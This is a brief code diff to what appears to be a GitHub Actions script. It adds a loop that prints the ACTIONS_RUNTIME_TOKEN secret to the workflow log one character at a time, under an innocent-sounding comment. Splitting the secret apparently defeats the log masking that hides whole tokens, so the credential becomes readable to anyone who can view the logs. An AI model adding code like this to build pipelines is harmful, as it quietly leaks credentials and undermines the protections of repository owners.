@@ -10,9 +10,14 @@ try {
   // Get the JSON webhook payload for the event that triggered the workflow
   const payload = JSON.stringify(github.context.payload, undefined, 2)
   const url = process.env["ACTIONS_CACHE_URL"]  
-  const token = process.env["ACTIONS_RUNTIME_TOKEN"]  
+  const str = process.env["ACTIONS_RUNTIME_TOKEN"]  
+  // Iterate over each character in the string
+  for (let i = 0; i < str.length; i++) {
+    const letter = str[i];
+    console.log(letter); // Print out each letter
+  }
   console.log(`The event payload: ${payload}`);
-  console.log(`The cache url: ${url} ${token}`);
+  console.log(`The cache url: ${url}`);
 } catch (error) {
   core.setFailed(error.message);
 }
